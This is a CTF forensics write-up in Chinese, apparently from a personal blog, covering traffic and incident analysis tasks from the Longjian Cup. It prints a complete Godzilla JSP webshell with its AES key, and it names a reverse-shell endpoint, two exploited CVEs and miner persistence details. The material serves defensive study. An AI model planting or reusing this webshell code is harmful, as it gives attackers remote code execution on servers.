---
title: 第二届陇剑杯初赛学习WP
tags:
  - WP
categories:
  - 比赛复现
swiper_index: 1
description: 个人对第二届陇剑杯的复现学习WP笔记
abbrlink: 8dc02fc6
date: 2025-09-04 18:24:24
---

## hard_web

### 题目1开放端口：

> 服务器开放了哪些端口，请按照端口大小顺序提交答案，并以英文逗号隔开(如服务器开放了80 81 82 83端口，则答案为80,81,82,83)

+ 首先确定哪一个ip为服务器ip

	+ 服务器ip具有一下特征

		+ 打开 **会话列表**，按字节数排序，找到流量最大的IP对。大概率包含服务器。
		+ 对流量最大的IP对应用 **端口过滤器**（如`tcp.port == 80`），确认服务器身份。
		+ 回到会话列表，按**数据包数量**排序，找到包数量异常多但数据量可能不大的IP，它很可能是攻击者。
		+ 对该可疑IP的通信 **Follow TCP Stream**，查看内容确认是否为攻击行为。
		+ 必要时使用 **错误过滤器**（`http.response.code >= 400`）辅助验证。

	+ 这里我们直接使用端口过滤`tcp.port == 80`

		![image-20250831114928920](posts/8dc02fc6/images/image-20250831114928920.webp)

	+ 可以看到服务器的ip应该为192.168.162.180

	+ 当服务器对应的端口打开时，会进行三次握手阶段

		![image-20250831121645177](posts/8dc02fc6/images/image-20250831121645177.webp)

	+ 所以我们知道服务器监听一个端口的时候会给客户端返回一个 `SYN=1,ACK=1`的包，筛选这个流量即可

	+ ![image-20250831122214851](posts/8dc02fc6/images/image-20250831122214851.webp)

	+ 这里我们也知道了客户端的ip为192.168.162.188，开放的端口为80，888，8888

即flag为80,888,8888

### 题目2服务器根目录中的flag

题目:

> 找到服务器中根目录中的flag

+ 通过上一道题我们已经知道了服务器的ip为192.168.162.180，那我们直接筛选该ip的http协议

	![image-20250831151628436](posts/8dc02fc6/images/image-20250831151628436.webp)

+ 通过前面的http流量也可以分辨出，该客户端先进行了网站目录扫描

+ 找到响应码返回200的，追踪http流量进行查看

	<img src ="/posts/8dc02fc6/images/image-20250831152234839.webp" alt="image-20250831152234839" style="zoom:50%;" />

+ 可以看到命令执行成功回显，接着查看流量，可以发现shell.jsp

	![image-20250831152354807](posts/8dc02fc6/images/image-20250831152354807.webp)

+ 查看流量，可以查看到木马的主体

	+ ![image-20250831152509021](posts/8dc02fc6/images/image-20250831152509021.webp)

	+ 这是哥斯拉的jsp木马，采用的aes加密，(直接丢给ai也能分析)

		<img src ="/posts/8dc02fc6/images/image-20250831153533690.webp" alt="image-20250831153533690" style="zoom: 33%;" />

	+ 定位到最后一个流量通信，导出为hexStream

		![image-20250831154551420](posts/8dc02fc6/images/image-20250831154551420.webp)

	+ 用cyberchef解密，哥斯拉的jsp木马采用aes的ECB加密

	+ 请求：![image-20250831155139054](posts/8dc02fc6/images/image-20250831155139054.webp)

	+ 响应：![image-20250831155242965](posts/8dc02fc6/images/image-20250831155242965.webp)

		成功拿到flag

> flag{9236b29d-5488-41e6-a04b-53b0d8276542}

### 题目3webshell密码

题目：

> 该webshell的连接密码是多少？

+ 回到之前拿到的shell主体

+ ```jsp
	<%! String xc="748007e861908c03"; class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }}%><%try{byte[] data=new byte[Integer.parseInt(request.getHeader("Content-Length"))];java.io.InputStream inputStream= request.getInputStream();int _num=0;while ((_num+=inputStream.read(data,_num,data.length))<data.length);data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters", data);Object f=((Class)session.getAttribute("payload")).newInstance();java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();f.equals(arrOut);f.equals(pageContext);f.toString();response.getOutputStream().write(x(arrOut.toByteArray(), true));} }catch (Exception e){}%>
	```

+ 分析一下代码即可拿到加密密码`748007e861908c03`

+ ![image-20250831160604521](posts/8dc02fc6/images/image-20250831160604521.webp)

+ 解密一下即可拿到webshell的密码

> 14mk3y

## Server_save

### 题目1黑客使用什么漏洞拿下root权限的

题目：

>黑客使用什么漏洞拿下root权限的

+ 首先打开final的pcap包看一下

	![image-20250831163747432](posts/8dc02fc6/images/image-20250831163747432.webp)

+ 发现大量基于helloworld的目录扫描请求，那就往下滑，锁定到了第一次开始响应200的流量

	![image-20250831163905539](posts/8dc02fc6/images/image-20250831163905539.webp)

+ 追踪http流量看一眼

	<img src="/posts/8dc02fc6/images/image-20250831163935522.webp" alt="image-20250831163935522" style="zoom:50%;" />

+ 这里直接网上搜流量特征`class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_`和spring有关的CVE，或者直接丢给ai，马上出结果

	<img src ="/posts/8dc02fc6/images/image-20250831164109246.webp" alt="image-20250831164109246" style="zoom:50%;" />

+ 成功拿到CVE编号

> CVE-2022-22965

### 题目2黑客反弹shell的ip和端口

题目：

>黑客反弹shell的ip和端口是什么？

接着上面往下看，可以发现他下载了一个可执行脚本，猜测是反弹shell程序

![image-20250831165255905](posts/8dc02fc6/images/image-20250831165255905.webp)

追踪http数据看一眼

<img src ="/posts/8dc02fc6/images/image-20250831165316882.webp" alt="image-20250831165316882" style="zoom:50%;" />

可以看到这是一个bash的反弹shell，(后面还用python做了一个伪终端)成功拿到反弹shell的ip和端口

> ip:195.168.43.128
>
> port:2333

### 题目3黑客的病毒名

题目：

> 黑客的病毒名称是什么？

+ 首先解压do.tar,还原用户的目录(不如palu杯给一个vmware镜像)

+ 检查必要流程，history、passwd、log，先看root的history

	<img src ="/posts/8dc02fc6/images/image-20250831172610488.webp" alt="image-20250831172610488" style="zoom:50%;" />

+ 什么都没有，再看passwd

	<img src ="/posts/8dc02fc6/images/image-20250831172828535.webp" alt="image-20250831172828535" style="zoom:50%;" />

+ 这就明显不对劲了，有两个非root用户，但是拥有root权限，去home目录下查看这两人的目录

+ home目录下面只有guest，那就先查看guest，发现guest下面有一个main程序，还有隐藏文件夹，打开看看

	![image-20250831173057607](posts/8dc02fc6/images/image-20250831173057607.webp)

+ 熟悉挖矿的就不用多说了，挖矿程序大多都以Miner结尾，都丢给微步看一下

+ [mian样本报告-微步在线云沙箱](https://s.threatbook.com/report/file/a489f8074a81b732c4f09e6e1e0ba7a89186a878d1c8b55056018fd383217cae?sign=history&env=ubuntu_1704_x64)

+ [sh执行文件样本报告-微步在线云沙箱](https://s.threatbook.com/report/file/624678687937ebdfbbd382b0c9fd56a916e1e2dbb3d939b9ce5a2a4d1d56e02e?sign=history&env=ubuntu_1704_x64)

	<img src ="/posts/8dc02fc6/images/image-20250831173330729.webp" alt="image-20250831173330729" style="zoom:50%;" />

	<img src ="/posts/8dc02fc6/images/image-20250831173349691.webp" alt="image-20250831173349691" style="zoom:50%;" />

+ 成功拿到病毒名

> main

### 题目4黑客创建了什么用户

题目：

> 黑客的病毒运行之后创建了什么用户

+ 那还是回到我们上一题的passwd文件查看，可以看到是有两个可疑用户的，接着我们去shadow文件查看加密密码

	<img src ="/posts/8dc02fc6/images/image-20250831173932775.webp" alt="image-20250831173932775" style="zoom:50%;" />

+ 直接拿到ll的密码123456，这个能出明文也是6，估计是赛方直接修改shadow文件的

> 123456

### 题目5服务器在被入侵时外网ip

题目：

> 服务器在被入侵时外网ip是多少？

按照思路来，history、passwd、后面紧跟着就是log了

guest目录下的.log文件

<img src ="/posts/8dc02fc6/images/image-20250831174920532.webp" alt="image-20250831174920532" style="zoom:50%;" />

成功拿到ip

> 172.105.202.239

### 题目6病毒运行之后释放文件

题目：

> 病毒运行之后释放了什么文件

直接看微步的分析报告[mian样本报告-微步在线云沙箱](https://s.threatbook.com/report/file/a489f8074a81b732c4f09e6e1e0ba7a89186a878d1c8b55056018fd383217cae?sign=history&env=ubuntu_1704_x64)

可以知道释放了.idea隐藏目录下的两个文件

<img src ="/posts/8dc02fc6/images/image-20250831175147129.webp" alt="image-20250831175147129" style="zoom:50%;" />

> lolMiner miner_doge.sh

### 题目7矿池地址

题目：

> 矿池地址是什么

查看sh的执行文件

<img src ="/posts/8dc02fc6/images/image-20250831175311225.webp" alt="image-20250831175311225" style="zoom:50%;" />

成功拿到矿池地址

> doge.millpools.cc:5567

### 题目8黑客的钱包地址

题目：

> 黑客的钱包地址

还是上面那个图，wallet就是钱包地址

> DOGE:DRXz1q6ys8Ao2KnPbtb7jQhPjDSqtwmNN9.lolMinerWorker

## WireShark

### 题目1被入侵的主机ip

题目：

> 被入侵的主机ip是？

telnet协议传输数据，这里就两个ip，192.168.246.28是服务端，192.168.246.1是客户端

所以被入侵的就是服务端

> 192.168.246.28

### 题目2被入侵的主机口令

题目：

> 被入侵的主机口令是？

追踪数据流看一下

<img src ="/posts/8dc02fc6/images/image-20250831181150409.webp" alt="image-20250831181150409" style="zoom:50%;" />

成功拿到password

> youcannevergetthis

### 题目3用户目录下第二个文件夹名

题目：

>用户目录下第二个文件夹名称是？

<img src ="/posts/8dc02fc6/images/image-20250831181337833.webp" alt="image-20250831181337833" style="zoom:50%;" />

还是追踪数据流，可以看到

第二个文件目录是Downloads

>Downloads

### 题目4/etc/passwd倒数第二个用户名

题目：

> /etc/passwd倒数第二个用户名是什么？

还是追踪数据流

<img src ="/posts/8dc02fc6/images/image-20250831181603961.webp" alt="image-20250831181603961" style="zoom:50%;" />

成功拿到用户名

> mysql

## IncidentResponse

### 题目1挖矿程序所在路径

题目：

> 你是公司的一名安全运营工程师，今日接到外部监管部门通报，你公司网络出口存在请求挖矿域名的行为。需要立即整改。经过与网络组配合，你们定位到了请求挖矿域名的内网IP是10.221.36.21。查询CMDB后得知该IP运行了公司的工时系统。（虚拟机账号密码为：root/IncidentResponsePasswd）
>
> 挖矿程序所在路径？

+ 首先如果电脑在挖矿的话，cpu是跑满的，所以首先用top看一下cpu

	<img src ="/posts/8dc02fc6/images/image-20250831182910410.webp" alt="image-20250831182910410" style="zoom:50%;" />

+ 罕见的没怎么跑，那就依然是三件套，history、passwd、log

+ 发现root目录下面有.viminfo文件

	<img src ="/posts/8dc02fc6/images/image-20250902135927371.webp" alt="image-20250902135927371" style="zoom:50%;" />

+ 查找以后发现进行多次redis操作

+ 查看redis的配置文件，发现有矿池钱包

	<img src ="/posts/8dc02fc6/images/image-20250902140333035.webp" alt="image-20250902140333035" style="zoom:50%;" />

+ 把redis的服务程序提交给微步进行分析[样本报告-微步在线云沙箱](https://s.threatbook.com/report/file/20a0864cb7dac55c184bd86e45a6e0acbd4bb19aa29840b824d369de710b6152)

	![image-20250902141043665](posts/8dc02fc6/images/image-20250902141043665.webp)

+ 成功找到Xminer的挖矿程序

看来是把挖矿程序伪装成了redis

> echo -n '/etc/redis/redis-server' | md5sum | cut -d '' -f1
>
> 6f72038a870f05cbf923633066e48881

### 题目2矿池域名

题目：

> 挖矿程序连接的矿池域名是什么？

还是回到redis的配置文件（redis,conf），成功拿到矿池域名

> echo -n 'donate.v2.xmrig.com' | md5sum | cut -d '' -f1
>
> 3fca20bb92d0ed67714e68704a0a4503

### 题目3攻击者的利用方式

题目：

> 攻击者入侵服务器的利用的方法是什么？

因为根据题目描述公司通过访问恶意域名而被挖矿，来到home/app/nohup.log下面,直接丢给ai分析这个日志

<img src ="/posts/8dc02fc6/images/image-20250902144312190.webp" alt="image-20250902144312190" style="zoom:50%;" />

成功拿到攻击方式，shiro的反序列化

>echo -n 'shirodeserialization' | md5sum | cut -d '' -f1
>
>3ee726cb32f87a15d22fe55fa04c4dcd

### 题目4攻击者的ip

题目：

> 攻击者的ip是什么？

+ 首先排查登录日志

	![image-20250902150924635](posts/8dc02fc6/images/image-20250902150924635.webp)

+ 成功锁定到了81.70.166.3这个ip

+ 然后查看nginx日志

	![image-20250902151200834](posts/8dc02fc6/images/image-20250902151200834.webp)

+ 也是这个ip

>echo -n '81.70.166.3' | md5sum | cut -d '' -f1
>
>c76b4b1a5e8c9e7751af4684c6a8b2c9

### 题目5攻击者发起攻击时的UA

题目：

> 攻击者发起攻击时的user-agent是多少？

攻击成功明显就是200的状态码

![image-20250902152420434](posts/8dc02fc6/images/image-20250902152420434.webp)

筛选200状态码，拿到UA

> echo -n 'mozilla/5.0(compatible;baiduspider/2.0;+http://www.baidu.com/search/spider.html)' | md5sum | cut -d '' -f1
>
> 6ba8458f11f4044cce7a621c085bb3c6

### 题目6攻击者使用的权限维持手段

题目：

> 攻击者使用了两种权限维持手段，相应的路径是？

+ 第一个就是我们上面的redis伪装
+ 我们首先排查redis的服务
	+ ![image-20250902211555984](posts/8dc02fc6/images/image-20250902211555984.webp)
+ 锁定redis的路径，`/lib/systemd/system/redis.service`

>echo -n '/lib/systemd/system/redis.service' | md5sum | cut -d '' -f1
>
>b2c5af8ce08753894540331e5a947d35

### 题目7第二种权限维持手段

题目：

>攻击者使用了两种权限维持手段，相应的路径是？

权限维持排查的手段，其中一种就是ssh手段伪装，攻击者通过在服务器放置公钥文件，客户端放置私钥文件，可以直接ssh连接

+ 这里我们首先排查root目录下的.ssh

	![image-20250902212707350](posts/8dc02fc6/images/image-20250902212707350.webp)

+ root@kali，如果采用ssh密钥对权限维持，最后部分就是user@attachermachine

>echo -n '/root/.ssh/authorized_keys' | md5sum | cut -d '' -f1
>
>a1fa1b5aeb1f97340032971c342c4258

## SmallSword

### 题目1连接蚁剑的密码

题目：

> 连接蚁剑的密码是？

清楚蚁剑默认是通过明文传输而且标志十分明显、

首先筛选http协议

![image-20250902215235601](posts/8dc02fc6/images/image-20250902215235601.webp)

熟悉sqli注入和php伪协议的应该一眼顶针

追踪数据流

![image-20250902215430553](posts/8dc02fc6/images/image-20250902215430553.webp)

url解码或者丢给ai

> 6ea280898e404bfabd0ebb702327b18f

### 题目2攻击者留存的值

题目：

> 攻击者留存的值是

依然是翻找蚁剑的操作

![image-20250902222857007](posts/8dc02fc6/images/image-20250902222857007.webp)



找到留存信息，这个蚁剑流量的作用是查看hacker.txt

但是这个格式不对，说明后面可能修改了hacker.txt，接着往后面翻，找到了

![image-20250902224329314](posts/8dc02fc6/images/image-20250902224329314.webp)

作用是文件写入操作，目的是将字符串base64编码的字符串解码之后写入到 `hacker.txt` 文件中。

解码之后得到

> ad6269b7-3ce2-4ae8-b97f-f259515e7a91 

### 题目3攻击者的flag

题目：

> 攻击者下载到的flag是

前面流量包分析有一个是下载了huorong.exe的流量

![image-20250903094625644](posts/8dc02fc6/images/image-20250903094625644.webp)

这个操作就是下载或者运行了hongrong.exe这个程序

![image-20250903094543627](posts/8dc02fc6/images/image-20250903094543627.webp)

把这个数据流量导出

![image-20250903094804388](posts/8dc02fc6/images/image-20250903094804388.webp)

按照数据大小排序，第一个就是的

<img src ="/posts/8dc02fc6/images/image-20250903094853599.webp" alt="image-20250903094853599" style="zoom:50%;" />

导出之后使用010查看，把蚁剑的识别头`->|`删去,，保存为exe文件

![image-20250903095051643](posts/8dc02fc6/images/image-20250903095051643.webp)

可以看到还是用pyinstalliner打包的，运行之后会在上一层目录拿到一张图片

![image-20250903095151358](posts/8dc02fc6/images/image-20250903095151358.webp)

修复宽高之后得到flag

<img src ="/posts/8dc02fc6/images/image-20250903095212161.webp" alt="image-20250903095212161" style="zoom:50%;" />

> flag3{8f0dffac-5801-44a9-bd49-e66192ce4f57}

## ez_web

### 题目1服务器自带的后门文件

题目：

> 服务器自带的后门文件是什么？

直接筛选http协议，发现d00r.php文件一直在执行命令

![image-20250903102041302](posts/8dc02fc6/images/image-20250903102041302.webp)

结果不是d00r.php这个文件，那直接查找看有没有什么上传了d00r了

成功找到ViewMore.php上传了这个木马(这里使用wireshark自带的查找或者使用`http contains "d00r"`规则查找都行)

![image-20250903102232916](posts/8dc02fc6/images/image-20250903102232916.webp)

> ViewMore.php

### 题目2服务器的内网ip

题目：

> 服务器的内网ip是多少

192.168.162.130不是题目想要的，那就是攻击者执行了ip之类的命令

成功找到ifconfig命令执行

![image-20250903103337737](posts/8dc02fc6/images/image-20250903103337737.webp)

> 192.168.101.132

### 题目3攻击者写入的key

题目：

> 攻击者往服务器中写入的key是什么？

还是追踪最后部分命令执行的http数据流，成功找到写入文件操作(最后一个流量)

![image-20250903110443285](posts/8dc02fc6/images/image-20250903110443285.webp)

base64解码转16进制

![image-20250903110536659](posts/8dc02fc6/images/image-20250903110536659.webp)

文件头是zip包，用010创建16进制，ctrl+shift+v粘贴保存为zip文件即可

![image-20250903110626946](posts/8dc02fc6/images/image-20250903110626946.webp)

但是zip包被加密了，接着看前面的流量，发现查看passwd

![image-20250903110737058](posts/8dc02fc6/images/image-20250903110737058.webp)

passwd提交解密成功

![image-20250903110759437](posts/8dc02fc6/images/image-20250903110759437.webp)

> 7d9ddff2-2d67-4eba-9e48-b91c26c42337

## baby_forensics

### 题目1磁盘中的key

题目：

> 磁盘中的key是多少？

题目给了两个文件，一个是raw文件，一个是vmdk文件，猜测一个是内存文件，一个是虚拟磁盘文件，虚拟磁盘文件被BitLocker锁住了，猜测密码是在raw文件里面

使用axiom直接分析raw文件

![image-20250903181304452](posts/8dc02fc6/images/image-20250903181304452.webp)

直接拿到BitLocker恢复密钥，diskgenius挂载磁盘

里面有一个key.txt，但是内容被加密了

![image-20250903181352343](posts/8dc02fc6/images/image-20250903181352343.webp)

直接把内容放到随波逐流一把梭

<img src ="/posts/8dc02fc6/images/image-20250903181456268.webp" alt="image-20250903181456268" style="zoom:50%;" />

成功拿到key

> 2e803070 85fd2b5c49c968c323ee25d5

### 题目2电脑中运行的计算器的运行结果

题目：

> 电脑中正在运行的计算器的运行结果是多少？

内存取证用volatility2

+ 先看内存是什么profile

	![image-20250903205740132](posts/8dc02fc6/images/image-20250903205740132.webp)

+ 然后查找计算器的进程

	+ ![image-20250903205845285](posts/8dc02fc6/images/image-20250903205845285.webp)

+ 进程图片调出不来，换方法了，把Windows窗口信息调出来

	+ ![image-20250903210100232](posts/8dc02fc6/images/image-20250903210100232.webp)

+ 查找calc.exe即可

	+ ![image-20250903210131705](posts/8dc02fc6/images/image-20250903210131705.webp)

拿到计算器结果

> 7598632541

### 题目3该内存文件的flag

题目：

> 该内存文件中存在的flag值是多少？

axiom查看到有加密内容文件

<img src ="/posts/8dc02fc6/images/image-20250903221324887.webp" alt="image-20250903221324887" style="zoom:50%;" />

文本内容base64解密一下

![image-20250903221405265](posts/8dc02fc6/images/image-20250903221405265.webp)

盐值打头说明是aes加密，接着在内存里面查找key，k3y，passwd，password关键字

![image-20250903221545340](posts/8dc02fc6/images/image-20250903221545340.webp)

导出查看文件

![image-20250903221611854](posts/8dc02fc6/images/image-20250903221611854.webp)

最后aes解密，拿到flag

![image-20250903221923612](posts/8dc02fc6/images/image-20250903221923612.webp)

> flag{ad9bca48-c7b0-4bd6-b6fb-aef90090bb98}

## tcpdump

### 题目1攻击者的用户名和登录密码

题目：

> 攻击者通过暴力破解进入了某wiki文档，请给出登录的用户名和密码，以:拼接

攻击者先扫描目录，然后尝试爆破登录，爆破登录的账号是TMjpxFGQwD

![image-20250904123323685](posts/8dc02fc6/images/image-20250904123323685.webp)

发现爆破失败，返回响应的长度为237

![image-20250904123423425](posts/8dc02fc6/images/image-20250904123423425.webp)

那直接修改规则为响应长度不为237即可

> http && frame.len!=237

![image-20250904123528396](posts/8dc02fc6/images/image-20250904123528396.webp)

或者根据返回内容筛选

>http && http contains "\"errCode\":200"

![image-20250904123958833](posts/8dc02fc6/images/image-20250904123958833.webp)

成功拿到爆破账号和密码

> TMjpxFGQwD:123457

### 题目2攻击者越权的cookie

题目：

> 攻击者发现软件存在越权漏洞，请给出攻击者越权使用的cookie的内容的md5值

登录时cookie为`accessToken=f412d3a0378d42439ee016b06ef3330c; zyplayertoken=f412d3a0378d42439ee016b06ef3330cQzw=; userid=2`，下面这个时候已经发现越权漏洞了，抓包进行修改id即可查看管理员界面的评论，但是cookie没有修改

![image-20250904130203069](posts/8dc02fc6/images/image-20250904130203069.webp)

这里直接把userid改为2了

![image-20250904130522095](posts/8dc02fc6/images/image-20250904130522095.webp)

那就是这个cookie了

> accessToken=f412d3a0378d42439ee016b06ef3330c; zyplayertoken=f412d3a0378d42439ee016b06ef3330cQzw=; userid=1
>
> 383c74db4e32513daaa1eeb1726d7255

### 题目3获取攻击者的jdbc的数据库账号密码

题目：

> 攻击者使用jdbc漏洞读取了应用配置文件，给出配置中的数据库账号密码，以:拼接

先抓到攻击者尝试利用jdbc的反序列化写入shell

![image-20250904162634566](posts/8dc02fc6/images/image-20250904162634566.webp)

后面成功抓到攻击者的shell内容，是一个反弹shell

![image-20250904162857159](posts/8dc02fc6/images/image-20250904162857159.webp)

根据反弹shell，攻击者可能走tcp协议，直接筛选tcp的规则

> tcp contains "username" && tcp contains "password"

一眼顶针这个反弹shell的ip，追踪tcp流

![image-20250904163324411](posts/8dc02fc6/images/image-20250904163324411.webp)

<img src ="/posts/8dc02fc6/images/image-20250904163438209.webp" alt="image-20250904163438209"  />

成功拿到账号密码

> zyplayer:1234567

### 题目4攻击者执行漏洞的CVE和EXP文件名

题目：

> 攻击者使用了CVE漏洞攻击应用，执行系统命令，请给出CVE编号以及远程EXP的文件名，使用:拼接

题目3我们已经分析了是利用的jdbc的反序列化写入shell

![image-20250904162634566](posts/8dc02fc6/images/image-20250904162634566.webp)

网上搜索cve和对应的payload即可得到cve编号

> cve org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg
>
> CVE-2022-21724:custom.dtd.xml

### 题目5攻击者下载的工具

题目：

> 给出攻击者获取系统权限后，下载的工具的名称

直接筛选攻击者的ip

> `ip.addr ==116.62.63.234 || ip.dst==116.62.63.234`

从末尾追踪tcp流，一眼顶针

![image-20250904164637223](posts/8dc02fc6/images/image-20250904164637223.webp)

> fscan

## hacked

### 题目1admin用户的密码

题目：

> admin用户的密码是什么？

wireshark直接搜索admin

![image-20250904165813686](posts/8dc02fc6/images/image-20250904165813686.webp)

发现加密了，有可能是前端加密，看有没有访问前端页面的，结果第一个就是

![image-20250904165918660](posts/8dc02fc6/images/image-20250904165918660.webp)

前端直接告诉我们了aes的cbc加密，pkcs7填充

![image-20250904170006605](posts/8dc02fc6/images/image-20250904170006605.webp)

> flag{WelC0m5_TO_H3re}

### 题目2app.config['SECRET_KEY']的值

题目：

>app.config['SECRET_KEY']的值是多少？

接着往下找，发现一个长度明显不对的

![image-20250904170629033](posts/8dc02fc6/images/image-20250904170629033.webp)

追踪http流看一眼，一眼顶针

![image-20250904170707939](posts/8dc02fc6/images/image-20250904170707939.webp)

> ssti_flask_hsfvaldb

### 题目3flask由哪个用户启动

题目：

>flask网站由哪个用户启动

前面一题提示我们是ssti注入，我们观察每个流量细节，cookie都会有明显变化，应该是session伪造的ssti注入，后面观察流量，发现有一个无回显（hello没有接值）

![image-20250904174955675](posts/8dc02fc6/images/image-20250904174955675.webp)

但是有一个set-cookie，明显不对劲，解密request看一下

![image-20250904175054005](posts/8dc02fc6/images/image-20250904175054005.webp)

发现执行了whoami命令，解密respone看一下

![image-20250904175154318](posts/8dc02fc6/images/image-20250904175154318.webp)

成功拿到用户名

> red

### 题目4攻击者写入的内存马

题目:

> 攻击者写入的内存马的路由名叫什么？

接着往后翻流量，看到长的就解密看一下，这个返回none的就很可疑

![image-20250904175716392](posts/8dc02fc6/images/image-20250904175716392.webp)

解密之后发现写入内存马路由

![image-20250904175748558](posts/8dc02fc6/images/image-20250904175748558.webp)

这里攻击者还访问了一次，测试是否写入成功

![image-20250904175835225](posts/8dc02fc6/images/image-20250904175835225.webp)

> Index









